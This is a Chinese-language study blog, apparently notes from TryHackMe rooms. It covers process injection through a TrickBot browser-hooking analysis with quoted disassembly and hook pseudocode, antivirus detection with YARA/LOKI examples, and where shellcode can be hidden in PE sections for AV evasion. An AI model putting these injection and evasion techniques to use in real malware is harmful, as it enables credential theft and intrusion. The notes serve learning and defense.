<li><strong>混淆/加密</strong>：改变的是代码的<strong>外观</strong>，以躲避杀毒软件的签名检测。</li>
<li><strong>节区操作</strong>：改变的是文件的<strong>内部结构和物理布局</strong>，旨在欺骗静态和动态分析工具，让恶意代码看起来像是文件本身的一个合法部分。</li>
</ul>
<h2 id="案例分析">案例分析</h2>
<p>来自 <a target="_blank" rel="noopener" href="https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/"><em>SentinelLabs</em></a> 的报告，这是一个 TrickBot 的 TTP 的分析报告。</p>
<p>TrickBot 是最近在金融犯罪软件领域重新流行起来的一种著名的银行恶意软件。</p>
<p>这里我们分析的是这个恶意软件的 Hook 浏览器的功能，他能 Hook 浏览器的 API 去拦截和窃取凭据。</p>
<p>我们先来看看它们是如何针对浏览器的。这段反汇编代码显示了 <code>push offset</code> 指令，这表明在调用 <code>OpenProcess</code> 之前，恶意软件正在将不同的浏览器可执行文件名（<code>chrome.exe</code>, <code>iexplore.exe</code>, <code>firefox.exe</code> 等）作为参数压入堆栈，以便逐一尝试打开它们。这表明了 TrickBot 在寻找一个可注入的目标。你的分析是正确的，它通过 <code>OpenProcess</code> 来获取浏览器进程的句柄。</p>
<figure class="shiki assembly"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre><code>push   eax
push   0
push   438h
call   ds:OpenProcess
mov    edi, eax
mov    [edp,hProcess], edi
test   edi, edi
jz     loc_100045EE
--------------------------------
push   offset Srch            ; "chrome.exe"
lea    eax, [ebp+pe.szExeFile]
...
mov    eax, ecx
push   offset aIexplore_exe   ; "iexplore.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aFirefox_exe   ; "firefox.exe"
push   eax                    ; lpFirst
...
mov    eax, ecx
push   offset aMicrosoftedgec   ; "microsoftedgecp.exe"
...</code></pre></div></div></figure>
<p>反射性注入的当前源代码尚不明确，但 SentinelLabs 已在下方概述了注入的基本程序流程。</p>
<ol>
<li>打开目标进程（<code>OpenProcess</code>）</li>
<li>分配内存（<code>VirtualAllocEx</code>）</li>
<li>复制<strong>钩子安装程序</strong>到分配的内存里（<code>WriteProcessMemory</code>）</li>
<li>复制 <strong>Shellcode</strong> 到分配的内存里（<code>WriteProcessMemory</code>）</li>
<li>刷新缓存（<code>FlushInstructionCache</code>）</li>
<li><strong>创建远程线程</strong>，让它去执行<strong>钩子安装程序</strong>（<code>CreateRemoteThread</code>）。</li>
<li>该新线程在执行钩子安装程序后，可能会<strong>创建一个新线程</strong>（<code>RtlCreateUserThread</code>）或恢复被挂起的线程。</li>
</ol>
<p>一旦注入，TrickBot 将调用其钩子安装程序函数，该函数已在第三步复制到内存中。SentinelLabs 在下方提供了安装程序函数的伪代码。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 计算我们恶意函数和原始函数中的偏移量</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// + 1 是跳过 jmp 直接访问后面的 32 位偏移量</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 这里的 -5 是用来抵消跳转指令本身的长度</span></span>
<span class="line"><span style="color: #ABB2BF">relative_offset </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> myHook_function </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(_DWORD </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 获取要被覆盖的原始指令的长度</span></span>
<span class="line"><span style="color: #ABB2BF">v8 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> __int8)</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">];</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 记住原来函数所在的地址 + 1 是为了跳过 jmp 直接访问后面的 32 位偏移量</span></span>
<span class="line"><span style="color: #ABB2BF">trampoline_lpvoid </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">**</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// &quot;0xE9&quot; 是跳转指令的机器码，即 jmp</span></span>
<span class="line"><span style="color: #ABB2BF">jmp_32_bit_relative_offset_opcode </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">E9</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">;		</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic">// 修改内存页的保护属性 让代码能写入这块内存</span></span>
<span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> ( </span><span style="color: #61AFEF">VirtualProtectEx</span><span style="color: #ABB2BF">((HANDLE)</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">FFFFFFFF</span><span style="color: #ABB2BF">, trampoline_lpvoid, v8, </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">40</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">flOldProtect) )</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这一部分没看明白 original_function 我不知道是什么</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 很可能是指浏览器中被钩子劫持的那个原始 API 函数</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 写入内存只有下面那一个方法，而且写的是 opcode</span></span>
<span class="line"><span style="color: #ABB2BF">	v10 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(_DWORD </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	v11 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> __int8)</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> (_DWORD)original_function </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">47</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">    </span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">66</span><span style="color: #ABB2BF">] </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">E9</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 这里相当于 original_function[67]</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(_DWORD </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">0x</span><span style="color: #D19A66">43</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> v10 </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> v11;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 手动写入内存</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">write_hook_iter</span><span style="color: #ABB2BF">(v10, </span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">jmp_32_bit_relative_offset_opcode, </span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic">    // 还原原始保护状态</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">VirtualProtectEx</span><span style="color: #ABB2BF">(</span></span>
<span class="line"><span style="color: #ABB2BF">		(HANDLE)</span><span style="color: #E06C75">0x</span><span style="color: #D19A66">FFFFFFFF</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">(LPVOID </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF">)(original_function </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">),</span></span>
<span class="line"><span style="color: #ABB2BF">		(</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> __int8)</span><span style="color: #E5C07B">original_function</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">5</span><span style="color: #ABB2BF">],</span></span>
<span class="line"><span style="color: #ABB2BF">		flOldProtect,</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #56B6C2">&amp;</span><span style="color: #ABB2BF">flOldProtect);</span></span>
<span class="line"><span style="color: #ABB2BF">result </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
<p>先丢在这里，之后实践的时候再研究。</p>
<h2 id="总结">总结</h2>
<p>这个房间就涵盖了注入的很多种方式，之前自己也看过一些注入手段，用的是未被公开的 API 来注入，绕过杀毒软件。就算我有这些基础，完成这个房间也是挺困难的，不过房间难度是 Hard，也正常吧。</p>
<h1>Introduction to Antivirus</h1>
<p>这个房间就简单的介绍了一下杀毒软件，概念性的比较多，后面的 yara 值得学习一下，能理解杀软是如何通过签名鉴定文件是否存在威胁的。</p>
<p>传统杀毒软件通过记录的文件指纹来查找恶意软件，现代杀毒软件通过整合多种技术，从静态到动态，构建了一个全面的防御体系，以识别和拦截不断演变的恶意软件。</p>
<p><strong>1. 核心：多层级检测</strong></p>
<ul>
<li><strong>静态检测（Signature-Based）</strong>：这是最基础的防线。它通过<strong>模式匹配</strong>，在恶意文件被执行之前，就扫描其独特的<strong>文件指纹</strong>（如哈希值、特定字节序列或字符串）。这种方式速度快，但容易被简单的文件修改（如加壳、混淆）绕过。</li>
<li><strong>启发式检测（Heuristic）</strong>：为了弥补静态检测的不足，启发式分析会根据代码的<strong>行为模式</strong>来判断其恶意性。例如，一个程序在没有用户交互的情况下试图访问系统关键区域，就可能被标记为可疑。</li>
<li><strong>动态检测（Behavioral）</strong>：这是最高级的防御层。杀毒软件会将可疑文件放入一个隔离的<strong>沙箱（Sandbox）**环境中执行，并**模拟</strong>其所有行为。通过监控以下活动来识别恶意意图：
<ul>
<li><strong>API 调用</strong>：是否调用了危险的系统函数，如创建新进程、修改注册表等。</li>
<li><strong>文件系统修改</strong>：是否试图删除、修改或加密用户文件。</li>
<li><strong>网络请求</strong>：是否试图连接到可疑的命令与控制服务器。</li>
</ul>
</li>
</ul>
<p><strong>2. 辅助功能：处理复杂威胁</strong></p>
<ul>
<li><strong>解压/解包（Decompression/Unpacking）</strong>：许多恶意软件会使用加壳或加密技术来隐藏其真实代码。杀毒软件的解包器能够<strong>还原</strong>这些文件，暴露其原始代码，以便进行静态分析。</li>
<li><strong>模拟器（Emulator）</strong>：模拟器是沙箱的核心组件，它在不影响真实系统的情况下，运行和分析恶意代码的每一个指令，从而发现其隐藏的行为。</li>
</ul>
<h2 id="静态检测">静态检测</h2>
<p>静态检测技术是最简单的杀毒软件检测类型，它基于恶意文件的预定义签名。简单来说，它在检测中使用模式匹配技术，例如查找唯一的字符串、CRC（校验和）、字节码/十六进制值序列以及加密哈希（MD5、SHA1 等）。</p>
<h3 id="工具">工具</h3>
<p>快捷看 Hash 工具 <a target="_blank" rel="noopener" href="https://github.com/namazso/OpenHashTab">OpenHashTab</a> 资源管理器集成，挺方便的</p>
<p>PEiD 看打包器 文件实际类型 文件头：<a target="_blank" rel="noopener" href="https://filesig.search.org/">https://filesig.search.org/</a></p>
<p>这里用到的是一个 yara 工具，一个很强大的自定义静态扫描工具</p>
<h2 id="Yara">Yara</h2>
<p>这里是去 Yara 房间里面学习了一下，不是这个房间的内容，但是强烈建议去学一遍再回来。</p>
<p>Room：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/yara">https://tryhackme.com/room/yara</a></p>
<h3 id="Yara-入门">Yara 入门</h3>
<p>在恶意软件中可能会有一些特征字符串，比如说虚拟币钱包地址，IP 地址，这种就可以作为敏感信息去检测他，而 Yara 就是根据文件呈现的特征或模式来确定文件是否恶意。</p>
<p>yara 命令需要两个参数才能生效，一个是规则文件，一个是目标（要使用该规则的文件名、目录或进程 ID）。</p>
<h3 id="Yara-规则">Yara 规则</h3>
<p><a target="_blank" rel="noopener" href="https://yara.readthedocs.io/en/stable/writingrules.html">https://yara.readthedocs.io/en/stable/writingrules.html</a></p>
<h4 id="Meta-元数据">Meta 元数据</h4>
<p>Yara 规则的这一部分是为规则作者的描述性信息保留的。例如，您可以使用 <code>description</code>（<code>desc</code> 的缩写）来总结您的规则检查的内容。此部分中的任何内容都不会影响规则本身。类似于代码注释，总结您的规则很有用。</p>
<h4 id="Strings-字符串">Strings 字符串</h4>
<p>你可以使用字符串在文件或程序中搜索特定的文本或十六进制。例如，假设我们想在一个目录中搜索所有包含“Hello World!”的文件，我们可以创建一个规则，如下所示：</p>
<figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>我们定义关键字 <code>Strings</code> ，其中我们想要搜索的字符串，即“Hello World!”，存储在变量 <code>$hello_world</code> 中。</p>
<p>当然，我们需要一个条件来使规则生效。在这个例子中，要使这个字符串成为条件，我们需要使用变量名。在这种情况下， <code>$hello_world</code> ：</p>
<figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>本质上，如果任何文件包含字符串“Hello World!”，则该规则将匹配。但是，这字面意思是只有找到“Hello World!”时才会匹配，而不会匹配“hello world”或“HELLO WORLD.”。</p>
<p>要解决此问题，条件 <code>any of them</code> 允许搜索多个字符串，如下所示：</p>
<figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world_lowercase = &quot;hello world&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world_uppercase = &quot;HELLO WORLD&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">any of them</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h4 id="Conditions-条件">Conditions 条件</h4>
<p>我们已经使用了 <code>true</code> 和 <code>any of them</code> 条件。与常规编程非常相似，你可以使用以下运算符：</p>
<ul>
<li><strong>&lt;=</strong> 小于或等于</li>
<li><strong>&gt;=</strong> 大于或等于</li>
<li><strong>!=</strong>  不等于</li>
</ul>
<p>下面的规则表示：当“Hello World!”字符串出现次数小于或等于十次时，才表示规则匹配</p>
<figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">#hello_world &lt;= 10</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h4 id="Combining-keywords-组合关键词">Combining keywords 组合关键词</h4>
<ul>
<li>and</li>
<li>not</li>
<li>or</li>
</ul>
<p>要组合多个条件。例如，如果你想检查一个文件是否包含某个字符串并且大小符合特定要求（在本例中，我们检查的样本文件小于 10 KB 且包含“Hello World!”），你可以使用如下规则：</p>
<figure class="shiki yaml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #98C379">rule helloworld_checker{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #E06C75">strings</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">		</span><span style="color: #98C379">$hello_world = &quot;Hello World!&quot;</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #ABB2BF">        </span></span>
<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E06C75">condition</span><span style="color: #ABB2BF">:</span></span>
<span class="line"><span style="color: #ABB2BF">	        </span><span style="color: #98C379">$hello_world and filesize &lt; 10KB</span><span style="color: #ABB2BF"> </span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h4 id="Yara-规则剖析">Yara 规则剖析</h4>
<p><a target="_blank" rel="noopener" href="https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd">handy cheatsheet</a></p>
<img src="/thm_rthe/1gThGNPenpT-AS-gjr8JCtA.png" class="" title="a picture showing a Yara rule cheatsheet developed by fr0gger_">
<h3 id="Yara-模块">Yara 模块</h3>
<h4 id="Cuckoo-Sandbox">Cuckoo Sandbox</h4>
<p>Cuckoo Sandbox 是一个自动化的恶意软件分析环境。此模块允许您根据 Cuckoo Sandbox 中发现的行为生成 Yara 规则。由于此环境会执行恶意软件，因此您可以根据特定行为（例如运行时字符串等）创建规则。</p>
<h4 id="Python-PE">Python PE</h4>
<p>Python 的 PE 模块允许你根据 Windows 可移植可执行文件 (PE) 结构的各个部分和元素创建 Yara 规则。</p>
<h3 id="Yara-工具">Yara 工具</h3>
<ul>
<li>LOKI 是由 Florian Roth 创建/编写的免费开源 IOC（入侵指标）扫描器。</li>
<li>THOR 多平台 IOC 和 YARA 扫描器</li>
<li>FENRIR
<ul>
<li>一个 bash 脚本</li>
</ul>
</li>
<li>YAYA (<em>Yet Another Yara Automaton</em>)
<ul>
<li>管理规则库用的</li>
</ul>
</li>
</ul>
<h3 id="使用-LOKI">使用 LOKI</h3>
<p>LOKI 是一个自动调用 yara 规则进行扫描的工具</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">python loki.py -p .</span></span></code></pre></div></div></figure>
<h3 id="使用-yarGen-创建-Yara-规则">使用 yarGen 创建 Yara 规则</h3>
<p>yarGen 是一个 YARA 规则生成器，它能根据恶意软件文件中发现的字符串创建 YARA 规则，同时删除所有在正常软件文件中也出现的字符串。</p>
<figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">yarGen.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/home/cmnatic/suspicious-files/file2</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--excludegood</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-o</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/home/cmnatic/suspicious-files/file2.yar</span></span>
<span class="line"></span>
<span class="line"><span style="color: #61AFEF">//</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">调用</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">loki</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">测试我们的文件</span></span>
<span class="line"><span style="color: #61AFEF">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">../tools/Loki/loki.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">.</span></span></code></pre></div></div></figure>
<h3 id="修改-Yara-规则">修改 Yara 规则</h3>
<p>原来的规则由于是简单的匹配字符串，导致我们扫描文本文件都会造成假阳，所以我们需要修改匹配规则。</p>
<figure class="shiki yara"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre><code>rule thm_demo_rule {
	meta:
		author = "THM: Intro-to-AV-Room"
		description = "Look at how the Yara rule works with ClamAV"
	strings:
		$a = "C:\\Users\\thm\\source\\repos\\AV-Check\\AV-Check\\obj\\Debug\\AV-Check.pdb"
	condition:
		$a
}</code></pre></div></div></figure>
<p>这里用一个 Magic Number 来增加一下判断条件，<code>EXE</code> 文件一般是由 <code>4D5A</code> 开始的。</p>
<p>修改后的规则：</p>
<figure class="shiki yara"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre><code>rule thm_demo_rule {
	meta:
		author = "THM: Intro-to-AV-Room"
		description = "Look at how the Yara rule works with ClamAV"
	strings:
		$a = "C:\\Users\\thm\\source\\repos\\AV-Check\\AV-Check\\obj\\Debug\\AV-Check.pdb"
		$b = "MZ"
	condition:
		$b at 0 and $a
}</code></pre></div></div></figure>
<h2 id="动态检测">动态检测</h2>
<p>第一种方法是通过监控 Windows API。检测引擎会检查 Windows 应用程序调用，并使用 Windows Hooks 监控 Windows API 调用。</p>
<p>第二种动态检测的另一种方法是沙盒。沙盒是一种虚拟化环境，用于运行与主机计算机隔离的恶意文件。这通常在隔离环境中进行，主要目标是分析恶意软件在系统中的行为方式。一旦恶意软件被确认，将根据二进制文件的特性创建唯一的签名和规则。最后，新的更新将被推送到云数据库以供将来使用。</p>
<p>说实话，比较鸡肋，第一种可以绕过，第二种可以避免。</p>
<p>还有一种就是行为检测了，异常行为不加白的应用直接拦。</p>
<h2 id="识别杀毒软件">识别杀毒软件</h2>
<p>房间介绍了开源的轮子 <a target="_blank" rel="noopener" href="https://github.com/PwnDexter/SharpEDRChecker">SharpEDRChecker</a>，和房间提供的用 C# 写的，我估计还有一些一行的脚本，毕竟这个就是简单的调系统 API 然后字符串匹配。</p>
<h1>AV Evasion: Shellcode</h1>
<p>这个房间介绍免杀技术。</p>
<h2 id="PE-结构">PE 结构</h2>
<h3 id="什么是-PE">什么是 PE</h3>
<p>之前的房间我们已经聊过这个了，丢一张图过来，更多资料可以参考<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format">微软文档</a>。</p>
<img src="/thm_rthe/ad61ff4aa1d4f649c02348dfa32eb613.png" class="" title="PE Structure">
<p>PE 结构中有不同类型的数据容器，每种容器存储不同的数据。</p>
<ol>
<li><code>.text</code> 保存程序的<strong>实际代码</strong></li>
<li><code>.data</code> 保存初始化和定义的变量</li>
<li><code>.bss</code> 保存未初始化数据（未赋值的声明变量）</li>
<li><code>.rdata</code> 包含只读数据</li>
<li><code>.edata</code>包含可导出对象和相关表格信息</li>
<li><code>.idata</code> 导入对象和相关表格信息</li>
<li><code>.reloc</code> 图像重定位信息</li>
<li><code>.rsrc</code> 链接程序使用的外部资源，如图像、图标、嵌入式二进制文件和清单文件，清单文件包含程序版本、作者、公司和版权等所有信息！</li>
</ol>
<p>以下是 Windows 加载器读取可执行二进制文件并将其作为进程运行的示例步骤。</p>
<ol>
<li>标头部分：DOS、Windows 和可选标头被解析以提供有关 EXE 文件的信息。例如，
<ul>
<li>魔术数字以“MZ”开头，这告诉加载器这是一个 EXE 文件。</li>
<li>文件签名</li>
<li>文件是为 x86 还是 x64 CPU 架构编译的。</li>
<li>创建时间戳。</li>
</ul>
</li>
<li>解析节表详情，例如
<ul>
<li>文件包含的节数。</li>
</ul>
</li>
<li>根据文件内容映射到内存中
<ul>
<li>EntryPoint 地址和 ImageBase 的偏移量。</li>
<li>RVA：相对虚拟地址，与 Imagebase 相关的地址。</li>
</ul>
</li>
<li>导入、DLL 和其他对象被加载到内存中。</li>
<li>EntryPoint 地址被定位，主执行函数运行。</li>
</ol>
<h3 id="为什么我们要了解-PE">为什么我们要了解 PE?</h3>
<p>我们会碰到打包和解包，这个就需要我们了解 PE 结构才知道原理。</p>
<p>另外创建或修改具有针对 Windows 机器的杀毒规避能力的恶意软件，我们需要了解 Windows 可执行文件（PE 文件）的结构以及恶意 shellcode 可以存储的位置。</p>
<p>我们可以通过定义和初始化 shellcode 变量的方式来控制将 shellcode 存储在哪个数据节中。</p>
<ol>
<li>在主函数中将 shellcode 定义为局部变量会将其存储在 .TEXT 部分（和执行的代码存储在一起）。</li>
<li>将 shellcode 定义为全局变量会将其存储在 .Data 部分。</li>
<li>另一种技术是将 shellcode 作为原始二进制文件存储在图标图像中，并将其链接到代码中，因此在这种情况下，它会显示在.rsrc Data 节中。</li>
<li>我们可以添加一个自定义数据节来存储 shellcode。</li>
</ol>
